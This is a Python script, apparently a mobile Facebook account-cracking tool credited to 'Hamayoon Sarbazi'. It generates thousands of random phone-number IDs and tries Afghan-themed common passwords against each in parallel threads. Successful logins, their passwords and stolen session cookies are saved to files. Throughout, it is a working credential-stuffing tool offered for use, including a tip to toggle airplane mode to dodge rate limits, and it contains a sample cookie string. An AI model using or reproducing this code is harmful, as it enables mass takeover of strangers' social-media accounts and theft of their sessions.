...
\33[1;92m .d8888.  .d8b.  d8888b. d8888b.  .d8b.  d88888D d888888b 
\33[1;92m 88'  YP d8' `8b 88  `8D 88  `8D d8' `8b YP  d8'   `88'   
\33[1;95m `8bo.   88ooo88 88oobY' 88oooY' 88ooo88    d8'     88    
\33[1;95m `Y8b. 88~~~88 88`8b   88~~~b. 88~~~88   d8'      88    
\33[1;92m db   8D 88   88 88 `88. 88   8D 88   88  d8' db   .88.   
\33[1;92m `8888Y' YP   YP 88   YD Y8888P' YP   YP d88888P Y888888P 
\33[1;97m-----------------------------------------------------------
\x1b[1;93m [+] AUTHER   :\x1b[1;92m HAMAYOON SARBAZI
\x1b[1;93m [+] FACEBOOK :\x1b[1;92mRAYEES HAMAYOON LIWANAY
\x1b[1;93m [+] GITHAB   :\x1b[1;92m SARBAZI
\x1b[1;93m [+] VERSION  :\x1b[1;92m \033[1;32m0.1
\33[1;97m-----------------------------------------------------------""")
def clear():
        os.system('clear')
        print(logo)
...
def file1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TRL-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        trl=session.cookies.get_dict().keys()
                        if "c_user" in trl:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [TRL-OK] %s | %s'%(ids,pas))
                                open('/sdcard/TRL-OK.txt', 'a').write(ids+' | '+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in trl:
                                if 'y' in pcp:
                                        print#('\r\r\x1b[38;5;208m [TRL-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TRL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                time.sleep(20)
        loop+=1
def file2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TRL-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
...
def trl():
    os.system('clear')
    print(logo)
    print('\x1b[1;96m[1] RANDOM METHOD  \x1b[1;92m1')
    print('\x1b[1;97m[2] RANDOM METHOD  \x1b[1;92m2')
    print('\x1b[1;97m[3] RANDOM METHOD  \x1b[1;92m3')
    print('\x1b[1;97m[4] RANDOM METHOD [\x1b[1;91mAPI\x1b[1;97m] \x1b[1;92m4')
    print('\x1b[1;91m[0] Go to main menu\x1b[1;97m')
    print('-----------------------------------------------')
    trl = input('\x1b[1;96m[+] CHOOSE METHOD : ')
    if trl =='1':
    	m1()
    if trl =='2':
    	m2()
    ...
    if trl =='0':
        ...
        print('\n\033[1;31m[•] THANKS FOR USING \033[1;37m')       
def trl1():
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('\x1b[1;96mEXAMPLE : 9378 9376 9379 9370 \033[0;97m')
    kode = input('PUT CODE : ')
    os.system('clear')
    print(logo)
    limit = int(input('\x1b[1;96mEXAMPLE : 2000 5000 10000 \nPUT LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as trl:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[1;93m[×] TOTAL IDS :\x1b[1;92m '+tl)
        print('\x1b[1;93m[+] CHOICE CODE :\x1b[1;92m '+kode)
        print('\x1b[1;96m[~] NETWORK : 2G 3G 4G & WIFI WORKING ')
        print('\x1b[1;96m[√] IF NO RESULTS USE FLIGHT(\33[1;31mAIRPLANE\33[1;37m)MODE ')
        print('---------------------------------------------------------')
        for guru in user:
            uid = kode+guru
            pwx = [guru,uid,'Û±Û²Û³Û´ÛµÛ¶','afghan123','kabul123','afghanistan','Afghan123','100200','۱۰۰۲۰۰','۱۲۳۴۵۶۷۸۹','۵۰۰۶۰۰','500500','afghan1234','700800']
            trl.submit(rcrack,uid,pwx,tl)
    print('-----------------------------------------------')
    print(' CRACK PROCESS HAS BEEN COMPLETED ')
    print(' IDS SAVED IN TRL-OK.txt | IN CP TRL-CP.txt')
    print('-----------------------------------------------')
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=r006ZvC9XRPsdUv_X9KAVDl0; sb=r006ZrZf0Hqn0FdqPTZDDFm1; ps_n=1; ps_l=1; vpd=v1%3B641x360x4; wl_cbv=v2%3Bclient_version%3A2495%3Btimestamp%3A1715238673; m_pixel_ratio=4; wd=360x641; fr=04XrGYOyLnrOuqLWc.AWVMgOFZ2dUxrBM8CBPG3vtMPI4.BmOk2v..AAA.0.0.BmUwoS.AWX9F86goAo',
    'dpr': '4',
    'save-data': 'on',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SARBAZI-OK] '+uid+' | '+ps+' \n COOKIE :\033[1;31m '+coki+' \033[0;97m')
                open('/sdcard/SARBAZI-OK.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[SARBAZI-CP] '+uid+' | '+ps+'\033[0;97m')
                open('/sdcard/SARBAZI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\033[1;37m[SARBAZI-M1] %s|%s \x1b[1;92mOK:-%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print('EXAMPLE : 9378 9376 9379 9370 \033[0;97m')
    kode = input('PUT CODE : ')
    os.system('clear')
    print(logo)
    limit = int(input('EXAMPLE : 2000 5000 10000 \nPUT LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as trl:
        ...
        print('[~] NETWORK : 2G 3G 4G & WIFI WORKING ')
        print('[√] IF NO RESULTS USE FLIGHT(\33[1;31mAIRPLANE\33[1;37m)MODE ')
        print('---------------------------------------------------------')
        for guru in user:
            uid = kode+guru
            pwx = [guru,uid,'Û±Û²Û³Û´ÛµÛ¶','afghan123','kabul123','afghanistan','Afghan123','100200','۱۰۰۲۰۰','۱۲۳۴۵۶۷۸۹','۵۰۰۶۰۰','500500','۱۲۳۴۵۶','afghan1234','kabul1234']
            trl.submit(rcrack1,uid,pwx,tl)
    print('-----------------------------------------------')
    print(' CRACK PROCESS HAS BEEN COMPLETED ')
    print(' IDS SAVED IN TRL-OK.txt | IN CP TRL-CP.txt')
    print('-----------------------------------------------')
...
def rcrack1(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[TRL-OK] '+cid+' | '+ps+' \n COOKIE :\033[1;34m '+coki+' \033[0;97m')
                open('/sdcard/TRL-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\033[1;31m[TRL-CP] '+cid+' | '+ps+'\033[0;97m')
                open('/sdcard/TRL-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=2
        sys.stdout.write('\r\033[1;37m[TRL-M2] %s|%s \x1b[1;92mOK:-%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def m3():
    ...
    with ThreadPool(max_workers=50) as trl:
        ...
        for guru in user:
            uid = kode+guru
            pwx = [guru,uid,'Û±Û²Û³Û´ÛµÛ¶','afghan123','kabul123','afghanistan','Afghan123','first123','last123','۱۲۳۴۵۶۷۸۹','۵۰۰۶۰۰','500500','۱۲۳۴۵۶','firstlast','FIRST123@@@']
            trl.submit(rcrack2,uid,pwx,tl)
    print('-----------------------------------------------')
    print(' CRACK PROCESS HAS BEEN COMPLETED ')
    print(' IDS SAVED IN TRL-OK.txt | IN CP TRL-CP.txt')
    print('-----------------------------------------------')
...
def rcrack2(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[TRL-OK] '+cid+' | '+ps+' \033[0;97m ')
                open('/sdcard/TRL-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                ...
                continue
        loop+=3
        sys.stdout.write('\r\033[1;37m[TRL-M3] %s|%s \x1b[1;92mOK:-%s   \r'%(loop,tl,len(oks)))
        sys.stdout.flush()
    except:
        pass
def m4():
    jalan('\33[1;34mINSHAALLAH FOR NEXT UPDATE ')
    jalan('\33[1;33mCOMING SOON');time.sleep(5)
    menu()
def menu():
        try:
                clear()
                ...
                if x == ("trl"):
                        ...
                        print('-----------------------------------------------')
                        xd=input('\033[1;37m[+] CHOOSES AN OPTION : ')
                        if xd in ['3','03']:
                        	os.system('xdg-open https://www.facebook.com/profile.php?id=100000400628720');menu()
                        if xd in ['2','02']:
                        	trl()
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        for user in fo:
                                                ...
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(file1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(file2,ids,names,passlist)
                                                else:
